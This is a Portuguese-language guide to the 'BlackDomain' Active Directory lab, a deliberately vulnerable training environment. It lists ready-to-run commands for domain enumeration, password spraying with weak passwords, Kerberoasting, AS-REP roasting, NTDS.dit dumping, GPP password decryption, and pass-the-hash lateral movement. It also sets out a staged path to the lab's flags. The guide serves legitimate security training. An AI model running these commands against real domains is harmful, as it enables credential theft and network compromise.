# 🔓 Vulnerabilidades do BlackDomain

Este documento descreve as vulnerabilidades implementadas no ambiente BlackDomain para fins educacionais.

> **⚠️ AVISO**: Este documento contém informações técnicas sobre as vulnerabilidades, mas **NÃO** revela a localização exata das flags. Use-o como guia de aprendizado.

---

## 📋 Índice

- [Enumeração de Domínio](#enumeração-de-domínio)
- [Exploração de SMB](#exploração-de-smb)
- [Password Spraying](#password-spraying)
- [Kerberoasting](#kerberoasting)
- [AS-REP Roasting](#as-rep-roasting)
- [SeBackupPrivilege Abuse](#sebackupprivilege-abuse)
- [GPP Passwords (MS14-025)](#gpp-passwords-ms14-025)
- [Credenciais em Texto Claro](#credenciais-em-texto-claro)
- [Lateral Movement](#lateral-movement)

---

## 1. Enumeração de Domínio

### Descrição
O Active Directory está configurado para permitir enumeração anônima via LDAP e SMB null sessions.

### Técnicas MITRE ATT&CK
- **T1087.002** - Account Discovery: Domain Account
- **T1018** - Remote System Discovery

### Ferramentas Recomendadas
```bash
# Enumeração LDAP
ldapsearch -x -H ldap://10.10.10.10 -b "DC=BlackDomain,DC=local"

# Enumeração SMB
enum4linux -a 10.10.10.10
crackmapexec smb 10.10.10.10 -u '' -p '' --users
crackmapexec smb 10.10.10.10 -u '' -p '' --shares

# BloodHound
bloodhound-python -d blackdomain.local -u alice -p Password123 -ns 10.10.10.10 -c all
```

### O que você pode descobrir
- Lista de usuários do domínio
- Grupos e suas memberships
- Compartilhamentos SMB
- Estrutura de OUs
- Políticas de domínio

---

## 2. Exploração de SMB

### Descrição
Compartilhamentos SMB configurados com permissões excessivas.

### Técnicas MITRE ATT&CK
- **T1021.002** - Remote Services: SMB/Windows Admin Shares
- **T1039** - Data from Network Shared Drive

### Compartilhamentos Disponíveis
| Share | Permissões | Conteúdo |
|-------|-----------|----------|
| `Public` | Everyone (Full Access) | Arquivos públicos |
| `Backups` | Backup Operators | Backups do sistema |
| `IT` | Domain Admins | Documentos de TI |

### Comandos
```bash
# Listar shares
smbclient -L //10.10.10.10 -N

# Acessar share público
smbclient //10.10.10.10/Public -N

# Enumerar com credenciais
crackmapexec smb 10.10.10.10 -u alice -p Password123 --shares
```

---

## 3. Password Spraying

### Descrição
Política de bloqueio de conta desabilitada, permitindo tentativas ilimitadas de autenticação.

### Técnicas MITRE ATT&CK
- **T1110.003** - Brute Force: Password Spraying

### Configuração Vulnerável
- ✅ Sem política de bloqueio de conta
- ✅ Auditoria de falhas de login desabilitada
- ✅ Múltiplos usuários com senhas fracas

### Ferramentas
```bash
# CrackMapExec
crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123'
crackmapexec smb 10.10.10.10 -u users.txt -p passwords.txt

# Kerbrute
kerbrute passwordspray -d blackdomain.local users.txt 'Password123'
```

### Senhas Comuns no Ambiente
- `Password123`
- `P@ssw0rd!`
- `Welcome2024`
- `Service123`

---

## 4. Kerberoasting

### Descrição
Conta de serviço com SPN configurado e senha fraca.

### Técnicas MITRE ATT&CK
- **T1558.003** - Steal or Forge Kerberos Tickets: Kerberoasting

### Conta Vulnerável
- **Usuário**: `svc_sql`
- **SPN**: `MSSQLSvc/ws02.blackdomain.local:1433`
- **Senha**: Crackeável com wordlist comum

### Exploração
```bash
# Obter TGS
GetUserSPNs.py BLACKDOMAIN/alice:Password123 -dc-ip 10.10.10.10 -request

# Salvar hash
GetUserSPNs.py BLACKDOMAIN/alice:Password123 -dc-ip 10.10.10.10 -request -outputfile hashes.txt

# Crack com hashcat
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# Crack com John
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

---

## 5. AS-REP Roasting

### Descrição
Usuário configurado sem pré-autenticação Kerberos requerida.

### Técnicas MITRE ATT&CK
- **T1558.004** - Steal or Forge Kerberos Tickets: AS-REP Roasting

### Conta Vulnerável
- **Usuário**: `john`
- **Configuração**: `DONT_REQ_PREAUTH` habilitado

### Exploração
```bash
# Enumerar usuários sem pré-auth
GetNPUsers.py BLACKDOMAIN/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat

# Obter hash diretamente
GetNPUsers.py BLACKDOMAIN/john -dc-ip 10.10.10.10 -no-pass

# Crack
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt
```

---

## 6. SeBackupPrivilege Abuse

### Descrição
Usuário membro do grupo "Backup Operators" com privilégios de backup.

### Técnicas MITRE ATT&CK
- **T1003.003** - OS Credential Dumping: NTDS

### Conta Privilegiada
- **Usuário**: `backup`
- **Grupo**: Backup Operators, Domain Admins
- **Privilégio**: SeBackupPrivilege

### Exploração
```bash
# Via impacket
secretsdump.py BLACKDOMAIN/backup:P@ssw0rd!@10.10.10.10

# Via reg save (local no DC)
reg save HKLM\SYSTEM system.bak
reg save HKLM\SAM sam.bak

# Extrair NTDS.dit
ntdsutil "ac i ntds" "ifm" "create full c:\temp\ntds" q q
```

---

## 7. GPP Passwords (MS14-025)

### Descrição
Senha de administrador local armazenada em Groups.xml no SYSVOL com criptografia AES256 (chave conhecida).

### Técnicas MITRE ATT&CK
- **T1552.006** - Unsecured Credentials: Group Policy Preferences

### Localização
```
\\dc01\SYSVOL\BlackDomain.local\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
```

### Exploração
```bash
# Buscar arquivos XML
crackmapexec smb 10.10.10.10 -u alice -p Password123 -M gpp_password

# Decriptar manualmente
gpp-decrypt "cpassword_value_here"

# Com PowerShell (no Windows)
Get-GPPPassword
```

---

## 8. Credenciais em Texto Claro

### Descrição
Credenciais armazenadas em arquivos de texto, scripts e histórico do PowerShell.

### Técnicas MITRE ATT&CK
- **T1552.001** - Unsecured Credentials: Credentials In Files
- **T1139** - Command History

### Locais Comuns
- `C:\Users\Public\Documents\passwords.txt`
- `C:\Temp\backup.bat`
- `$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

### Busca
```powershell
# Buscar por senhas em arquivos
Get-ChildItem C:\ -Recurse -Include *.txt,*.bat,*.ps1 | Select-String -Pattern "password"

# Histórico do PowerShell
Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

---

## 9. Lateral Movement

### Descrição
WinRM habilitado e Pass-the-Hash permitido.

### Técnicas MITRE ATT&CK
- **T1021.006** - Remote Services: Windows Remote Management
- **T1550.002** - Use Alternate Authentication Material: Pass the Hash

### Exploração
```bash
# WinRM com credenciais
evil-winrm -i 10.10.20.11 -u alice -p Password123

# Pass-the-Hash
crackmapexec smb 10.10.20.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:hash_here

# PSExec
psexec.py BLACKDOMAIN/alice:Password123@10.10.20.11
```

---

## 🎯 Path de Exploração Sugerido

### Nível 1 - Reconhecimento
1. Enumerar domínio (LDAP/SMB)
2. Descobrir usuários e compartilhamentos
3. **FLAG 1** via SMB público

### Nível 2 - Credenciais Iniciais
4. Password spraying
5. Obter credenciais válidas
6. **FLAG 4** em arquivos de texto

### Nível 3 - Ataques Kerberos
7. Kerberoasting (svc_sql)
8. AS-REP Roasting (john)
9. Crack de hashes

### Nível 4 - Escalação de Privilégios
10. GPP Password decryption
11. **FLAG 3** via GPP
12. SeBackupPrivilege abuse
13. **FLAG 2** via Backup Operators

### Nível 5 - Domínio Comprometido
14. Dump NTDS.dit
15. Pass-the-Hash
16. Lateral movement
17. **FLAG 5** no histórico PowerShell

### Nível 6 - Persistência e Logs
18. Acessar servidor de logs
19. **FLAG 6** no Wazuh
20. **FLAG 7** via escalação Linux

---

## 📚 Referências

### Documentação
- [MITRE ATT&CK - Active Directory](https://attack.mitre.org/)
- [HackTricks - AD Methodology](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)

### Ferramentas
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)

### CVEs Relacionados
- **MS14-025** - GPP Passwords
- **CVE-2020-1472** - Zerologon (não implementado)
- **CVE-2021-42278/42287** - sAMAccountName Spoofing (não implementado)

---

**Desenvolvido para fins educacionais - Use responsavelmente! 🎓**
